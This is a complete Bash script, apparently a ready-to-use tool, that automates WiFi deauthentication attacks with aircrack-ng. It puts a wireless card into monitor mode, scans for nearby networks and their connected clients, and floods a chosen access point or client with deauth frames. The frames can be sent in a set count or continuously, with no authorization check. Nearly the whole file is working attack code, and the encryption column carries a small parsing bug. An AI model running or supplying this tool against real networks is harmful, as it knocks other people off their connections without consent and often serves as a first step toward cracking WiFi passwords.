#!/bin/bash

# Network Deauthentication Script
# This script allows monitoring wireless networks and performing deauthentication attacks

# Colors for better readability
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Variables
TEMP_DIR="/tmp/netdeauth_$$"
MONITOR_INTERFACE=""
TARGET_BSSID=""
TARGET_CHANNEL=""
TARGET_ESSID=""

# Check if running as root
if [ "$EUID" -ne 0 ]; then
  echo -e "${RED}Error: Please run as root${NC}"
  exit 1
fi

# Check for required tools
check_requirements() {
    local tools=("airmon-ng" "airodump-ng" "aireplay-ng")
    local missing=0
    
    echo -e "${BLUE}Checking requirements...${NC}"
    for tool in "${tools[@]}"; do
        if ! command -v "$tool" &>/dev/null; then
            echo -e "${RED}Missing required tool: $tool${NC}"
            missing=1
        fi
    done
    
    if [ $missing -eq 1 ]; then
        echo -e "${RED}Please install Aircrack-ng suite: apt install aircrack-ng${NC}"
        exit 1
    fi
    
    # Create temp directory
    mkdir -p "$TEMP_DIR"
}

# Show help message
show_help() {
    echo -e "${GREEN}Network Deauthentication Script${NC}"
    echo "Usage: $0 [options]"
    echo ""
    echo "Options:"
    echo "  -h, --help     Show this help message"
    echo "  -i INTERFACE   Specify wireless interface"
    echo ""
    echo "Run without options for interactive mode"
    exit 0
}

# Parse command line arguments
parse_args() {
    while [[ $# -gt 0 ]]; do
        case $1 in
            -h|--help)
                show_help
                ;;
            -i)
                interface=$2
                shift
                ;;
            *)
                echo -e "${RED}Unknown option: $1${NC}"
                show_help
                ;;
        esac
        shift
    done
}

# Function to display available network interfaces
show_interfaces() {
    local interfaces=()
    local i=1
    
    echo -e "${BLUE}Detecting network interfaces...${NC}"
    
    # Try multiple methods to identify wireless interfaces
    
    # Method 1: Check for interfaces in /sys/class/net with wireless subdirectory
    for iface in /sys/class/net/*; do
        if [ -d "$iface/wireless" ] || [ -d "$iface/phy80211" ]; then
            interfaces+=("$(basename "$iface")")
        fi
    done
    
    # Method 2: Use iw command if available
    if command -v iw &>/dev/null; then
        while read -r line; do
            if [[ "$line" =~ ^[[:space:]]*Interface[[:space:]]([^ ]+) ]]; then
                iface="${BASH_REMATCH[1]}"
                if [[ ! " ${interfaces[@]} " =~ " ${iface} " ]]; then
                    interfaces+=("$iface")
                fi
            fi
        done < <(iw dev 2>/dev/null)
    fi
    
    # Method 3: Check for wlan interfaces
    for iface in /sys/class/net/wlan*; do
        if [ -e "$iface" ]; then
            iface=$(basename "$iface")
            if [[ ! " ${interfaces[@]} " =~ " ${iface} " ]]; then
                interfaces+=("$iface")
            fi
        fi
    done
    
    # Display found wireless interfaces
    if [ ${#interfaces[@]} -gt 0 ]; then
        echo -e "${GREEN}Available wireless interfaces:${NC}"
        for iface in "${interfaces[@]}"; do
            echo -e "${BLUE}$i. $iface${NC}"
            ((i++))
        done
        # Store interfaces for later selection
        printf "%s\n" "${interfaces[@]}" > "$TEMP_DIR/interfaces.txt"
    else
        echo -e "${YELLOW}No wireless interfaces detected.${NC}"
        
        # Fall back to showing all interfaces
        echo -e "${YELLOW}Showing all network interfaces:${NC}"
        i=1
        while read -r line; do
            if [[ "$line" =~ ^[0-9]+:[[:space:]]([^:]+): ]]; then
                iface="${BASH_REMATCH[1]}"
                # Skip loopback and virtual interfaces
                if [[ "$iface" != "lo" && "$iface" != veth* && "$iface" != docker* && "$iface" != br* ]]; then
                    echo -e "${BLUE}$i. $iface${NC}"
                    interfaces+=("$iface")
                    ((i++))
                fi
            fi
        done < <(ip link show)
        
        # Store interfaces for later selection
        printf "%s\n" "${interfaces[@]}" > "$TEMP_DIR/interfaces.txt"
        
        if [ ${#interfaces[@]} -eq 0 ]; then
            echo -e "${RED}No usable network interfaces found.${NC}"
            return 1
        fi
    fi
    
    return 0
}

# Function to select network interface
select_interface() {
    if [ -n "$interface" ]; then
        echo -e "${BLUE}Using specified interface: $interface${NC}"
    else
        if ! show_interfaces; then
            echo -e "${RED}Failed to detect network interfaces.${NC}"
            return 1
        fi
        
        echo -e "${GREEN}Enter the number of the interface to use (or 'q' to quit):${NC}"
        read choice
        
        # Check if user wants to quit
        if [[ "$choice" == "q" || "$choice" == "Q" ]]; then
            echo -e "${BLUE}Exiting...${NC}"
            exit 0
        fi
        
        # Validate numeric input
        if ! [[ "$choice" =~ ^[0-9]+$ ]]; then
            echo -e "${RED}Invalid selection. Please enter a number.${NC}"
            return 1
        fi
        
        # Get interface from selection
        interface=$(sed -n "${choice}p" "$TEMP_DIR/interfaces.txt")
        
        if [ -z "$interface" ]; then
            echo -e "${RED}Invalid selection.${NC}"
            return 1
        fi
        
        echo -e "${BLUE}Selected interface: $interface${NC}"
    fi
    
    # Check if interface exists
    if ! ip link show "$interface" &>/dev/null; then
        echo -e "${RED}Interface $interface does not exist.${NC}"
        return 1
    fi
    
    # Put interface in monitor mode
    echo -e "${BLUE}Putting $interface into monitor mode...${NC}"
    airmon-ng check kill >/dev/null
    airmon-ng start "$interface" >/dev/null
    
    # Get the monitor interface name (usually interface + mon)
    MONITOR_INTERFACE="${interface}mon"
    if ! ip link show "$MONITOR_INTERFACE" &>/dev/null; then
        # Try other common monitor interface naming patterns
        if ip link show "mon0" &>/dev/null; then
            MONITOR_INTERFACE="mon0"
        elif ip link show "${interface}mon0" &>/dev/null; then
            MONITOR_INTERFACE="${interface}mon0"
        else
            # Some drivers use the same interface name in monitor mode
            MONITOR_INTERFACE="$interface"
        fi
    fi
    
    # Verify the monitor interface exists
    if ! ip link show "$MONITOR_INTERFACE" &>/dev/null; then
        echo -e "${RED}Failed to create monitor interface. Please check your wireless card supports monitor mode.${NC}"
        return 1
    fi
    
    echo -e "${GREEN}Monitor interface: $MONITOR_INTERFACE${NC}"
    return 0
}

# Function to scan for networks using airodump-ng
scan_networks() {
    echo -e "${BLUE}Scanning for wireless networks on $MONITOR_INTERFACE...${NC}"
    echo -e "${YELLOW}Press Enter when you want to stop scanning.${NC}"
    
    # Create temporary files for scan results
    SCAN_FILE="$TEMP_DIR/network_scan"
    
    # Start airodump-ng in background
    airodump-ng -w "$SCAN_FILE" --output-format csv "$MONITOR_INTERFACE" >/dev/null 2>&1 &
    airodump_pid=$!
    
    # Set up a monitoring process to count networks in real-time
    (
        # Previous count to determine when to update
        prev_count=0
        
        # Monitor until the scan process is killed
        while kill -0 $airodump_pid 2>/dev/null; do
            if [ -f "${SCAN_FILE}-01.csv" ]; then
                # Count networks by excluding headers and empty lines
                current_count=$(grep -v "^$" "${SCAN_FILE}-01.csv" | grep -v "^BSSID" | grep -v "^Station MAC" | wc -l)
                
                # Only update if count has changed
                if [ "$current_count" -ne "$prev_count" ]; then
                    echo -ne "\r${GREEN}Networks found: $current_count ${NC}  "
                    prev_count=$current_count
                fi
            fi
            # Check every 0.5 seconds
            sleep 0.5
        done
    ) &
    monitor_pid=$!
    
    # Wait for user to press Enter
    read
    
    # Kill the monitor process
    kill $monitor_pid 2>/dev/null
    
    # Kill airodump-ng
    kill $airodump_pid 2>/dev/null
    wait $airodump_pid 2>/dev/null
    
    # Clear the line and print newline
    echo -e "\r\033[K"
    
    # Parse and display networks from CSV file
    if [ -f "${SCAN_FILE}-01.csv" ]; then
        # Clean temp file for networks
        > "$TEMP_DIR/available_networks.txt"
        
        # Process the CSV file to get networks - with careful text extraction
        counter=1
        total_networks=0
        
        while IFS= read -r line; do
            # Skip empty lines and header
            if [[ -z "$line" || "$line" =~ ^BSSID || "$line" =~ ^Station ]]; then
                continue
            fi
            
            # Extract and clean fields from CSV
            bssid=$(echo "$line" | awk -F, '{print $1}' | sed 's/^ *//;s/ *$//')
            channel=$(echo "$line" | awk -F, '{print $4}' | sed 's/^ *//;s/ *$//')
            power=$(echo "$line" | awk -F, '{print $6}' | sed 's/^ *//;s/ *$//')
            encryption=$(echo "$line" | awk -F, '{print $6}' | sed 's/^ *//;s/ *$//')
            essid=$(echo "$line" | awk -F, '{print $14}' | sed 's/^ *//;s/ *$//')
            
            # Only process if it's an actual network (has BSSID and isn't a station)
            if [[ -n "$bssid" && ! "$bssid" =~ ^Station ]]; then
                # Store in our file with semicolons as separators
                echo "${counter};${bssid};${channel};${power};${encryption};${essid}" >> "$TEMP_DIR/available_networks.txt"
                ((counter++))
                ((total_networks++))
            fi
        done < "${SCAN_FILE}-01.csv"
        
        echo -e "${GREEN}Scan complete. Found $total_networks networks.${NC}"
        
        # Display table header
        printf "\n${GREEN}%-4s %-18s %-8s %-8s %-10s %s${NC}\n" "No." "BSSID" "Channel" "Power" "Encryption" "ESSID"
        printf "${GREEN}%-4s %-18s %-8s %-8s %-10s %s${NC}\n" "===" "==================" "========" "========" "==========" "====="
        
        # Display networks in table format
        while IFS=";" read -r num bssid channel power encryption essid; do
            # Get better encryption info
            if [[ "$encryption" == *"WPA2"* ]]; then
                encryption="WPA2"
            elif [[ "$encryption" == *"WPA"* ]]; then
                encryption="WPA"
            elif [[ "$encryption" == *"WEP"* ]]; then
                encryption="WEP"
            else
                encryption="Open"
            fi
            
            # Format better power value
            power="${power}dBm"
            
            printf "${BLUE}%-4s %-18s %-8s %-8s %-10s %s${NC}\n" \
                "${num}." "${bssid}" "Ch:${channel}" "${power}" "${encryption}" "${essid}"
        done < "$TEMP_DIR/available_networks.txt"
        
        echo ""
    else
        echo -e "${RED}No networks found or scan interrupted.${NC}"
        return 1
    fi
    
    return 0
}

# Function to select target network
select_target() {
    echo -e "${GREEN}Enter the number of the network to target:${NC}"
    read -p "> " target_num
    
    # Get the selected network's info
    selected=$(grep "^${target_num};" "$TEMP_DIR/available_networks.txt")
    
    if [ -z "$selected" ]; then
        echo -e "${RED}Invalid selection.${NC}"
        return 1
    fi
    
    # Extract BSSID, channel and ESSID
    IFS=";" read -r _ TARGET_BSSID TARGET_CHANNEL _ _ TARGET_ESSID <<< "$selected"
    
    echo -e "${GREEN}Selected target network: ${BLUE}$TARGET_ESSID${NC} (BSSID: ${BLUE}$TARGET_BSSID${NC}, Channel: ${BLUE}$TARGET_CHANNEL${NC})"
    
    # Get clients of the selected network
    echo -e "${BLUE}Scanning for clients on $TARGET_ESSID...${NC}"
    echo -e "${YELLOW}Press Enter to stop scanning for clients...${NC}"
    
    # Start targeted scan
    CLIENT_SCAN_FILE="$TEMP_DIR/client_scan"
    airodump-ng -c "$TARGET_CHANNEL" --bssid "$TARGET_BSSID" -w "$CLIENT_SCAN_FILE" --output-format csv "$MONITOR_INTERFACE" >/dev/null 2>&1 &
    client_scan_pid=$!
    
    read
    
    # Kill the client scan
    kill $client_scan_pid 2>/dev/null
    wait $client_scan_pid 2>/dev/null
    
    # Parse and display clients
    if [ -f "${CLIENT_SCAN_FILE}-01.csv" ]; then
        > "$TEMP_DIR/available_clients.txt"
        
        # Process client information carefully
        counter=1
        station_section=false
        
        while IFS= read -r line; do
            # Start processing after "Station MAC" line
            if [[ "$line" =~ "Station MAC" ]]; then
                station_section=true
                continue
            fi
            
            # Only process if we're in the station section
            if [[ "$station_section" == true && -n "$line" && ! "$line" =~ ^$ ]]; then
                # Extract client MAC, power and packets
                mac=$(echo "$line" | awk -F, '{print $1}' | sed 's/^ *//;s/ *$//')
                power=$(echo "$line" | awk -F, '{print $4}' | sed 's/^ *//;s/ *$//')
                packets=$(echo "$line" | awk -F, '{print $5}' | sed 's/^ *//;s/ *$//')
                
                # Only add if we have a valid MAC
                if [[ -n "$mac" && ${#mac} -ge 17 ]]; then
                    echo "${counter};${mac};${power};${packets}" >> "$TEMP_DIR/available_clients.txt"
                    ((counter++))
                fi
            fi
        done < "${CLIENT_SCAN_FILE}-01.csv"
        
        # Check if we found any clients
        if [ ! -s "$TEMP_DIR/available_clients.txt" ]; then
            echo -e "${YELLOW}No clients found for this network.${NC}"
            echo "0. Continue anyway (broadcast deauth)"
            echo "1. Scan again for clients" 
            echo "2. Select another network"
            echo "3. Quit"
            read -p "Select option [0-3]: " client_option
            
            case $client_option in
                0) return 0 ;;
                1) select_target; return $? ;;
                2) scan_networks && select_target; return $? ;;
                *) echo -e "${RED}Quitting...${NC}"; return 1 ;;
            esac
        fi
        
        echo -e "${GREEN}Found clients:${NC}"
        
        # Display table header for clients
        printf "\n${GREEN}%-4s %-18s %-10s %-10s${NC}\n" "No." "MAC Address" "Power" "Packets"
        printf "${GREEN}%-4s %-18s %-10s %-10s${NC}\n" "===" "==================" "==========" "=========="
        
        # Display clients in table format
        while IFS=";" read -r num mac power packets; do
            # Format power
            power="${power} dBm"
            
            printf "${BLUE}%-4s %-18s %-10s %-10s${NC}\n" "${num}." "${mac}" "${power}" "${packets}"
        done < "$TEMP_DIR/available_clients.txt"
        
        echo ""
        return 0
    else
        echo -e "${RED}No client scan data available.${NC}"
        return 1
    fi
}

# Function to perform deauth attack
perform_deauth() {
    local packet_count
    local continuous
    
    echo -e "${GREEN}Enter number of deauth packets to send (0 for continuous):${NC}"
    read -p "> " packet_count
    
    if [ "$packet_count" -eq 0 ]; then
        continuous=1
        packet_count=0
    else
        continuous=0
    fi
    
    echo -e "${GREEN}Select client to deauthenticate:${NC}"
    echo "0. All clients (broadcast deauth)"
    
    # Show clients table if available
    if [ -s "$TEMP_DIR/available_clients.txt" ]; then
        # Display table header for clients
        printf "\n${GREEN}%-4s %-18s %-10s %-10s${NC}\n" "No." "MAC Address" "Power" "Packets"
        printf "${GREEN}%-4s %-18s %-10s %-10s${NC}\n" "===" "==================" "==========" "=========="
        
        # Display clients in table format
        while IFS=";" read -r num mac power packets; do
            power="${power} dBm"
            printf "${BLUE}%-4s %-18s %-10s %-10s${NC}\n" "${num}." "${mac}" "${power}" "${packets}"
        done < "$TEMP_DIR/available_clients.txt"
        
        echo ""
    fi
    
    read -p "> " client_choice
    
    if [ "$client_choice" = "0" ]; then
        echo -e "${YELLOW}Sending deauthentication packets to all clients...${NC}"
        if [ $continuous -eq 1 ]; then
            echo -e "${RED}Press Ctrl+C to stop the attack${NC}"
            aireplay-ng --deauth 0 -a "$TARGET_BSSID" "$MONITOR_INTERFACE"
        else
            aireplay-ng --deauth "$packet_count" -a "$TARGET_BSSID" "$MONITOR_INTERFACE"
        fi
    else
        # Get the selected client MAC
        selected_client=$(grep "^${client_choice};" "$TEMP_DIR/available_clients.txt")
        
        if [ -z "$selected_client" ]; then
            echo -e "${RED}Invalid selection.${NC}"
            return 1
        fi
        
        IFS=";" read -r _ client_mac _ _ <<< "$selected_client"
        echo -e "${YELLOW}Sending deauthentication packets to client $client_mac...${NC}"
        
        if [ $continuous -eq 1 ]; then
            echo -e "${RED}Press Ctrl+C to stop the attack${NC}"
            aireplay-ng --deauth 0 -a "$TARGET_BSSID" -c "$client_mac" "$MONITOR_INTERFACE"
        else
            aireplay-ng --deauth "$packet_count" -a "$TARGET_BSSID" -c "$client_mac" "$MONITOR_INTERFACE"
        fi
    fi
    
    echo -e "${GREEN}Deauth attack completed.${NC}"
    return 0
}

# Function to clean up
cleanup() {
    echo -e "${BLUE}Cleaning up...${NC}"
    
    # Stop monitor mode if we created a monitor interface
    if [ -n "$MONITOR_INTERFACE" ]; then
        echo -e "${BLUE}Stopping monitor mode on $MONITOR_INTERFACE...${NC}"
        airmon-ng stop "$MONITOR_INTERFACE" >/dev/null 2>&1
    fi
    
    # Remove temporary directory
    if [ -d "$TEMP_DIR" ]; then
        rm -rf "$TEMP_DIR"
    fi
    
    echo -e "${GREEN}Done.${NC}"
}

# Set up trap to clean up on exit
trap cleanup EXIT INT TERM

# Main function to control program flow
main() {
    echo -e "${GREEN}========================================${NC}"
    echo -e "${GREEN}   Network Deauthentication Script      ${NC}"
    echo -e "${GREEN}========================================${NC}"
    
    # Create temp directory first to store interface info
    mkdir -p "$TEMP_DIR"
    
    check_requirements
    parse_args "$@"
    
    # Main program loop
    while true; do
        if select_interface; then
            if scan_networks; then
                if select_target; then
                    perform_deauth
                    
                    echo -e "${GREEN}What would you like to do next?${NC}"
                    echo "1. Perform another deauth attack on same network"
                    echo "2. Select another network"
                    echo "3. Select another interface"
                    echo "4. Exit"
                    read -p "Select option [1-4]: " next_action
                    
                    case $next_action in
                        1) continue ;;
                        2) scan_networks; continue ;;
                        3) break ;;
                        *) echo -e "${BLUE}Exiting...${NC}"; exit 0 ;;
                    esac
                fi
            fi
        fi
        
        echo -e "${GREEN}Would you like to try again? (y/n)${NC}"
        read -p "> " try_again
        if [[ ! "$try_again" =~ ^[Yy] ]]; then
            echo -e "${BLUE}Exiting...${NC}"
            exit 0
        fi
    done
}

# Start the program
main "$@"
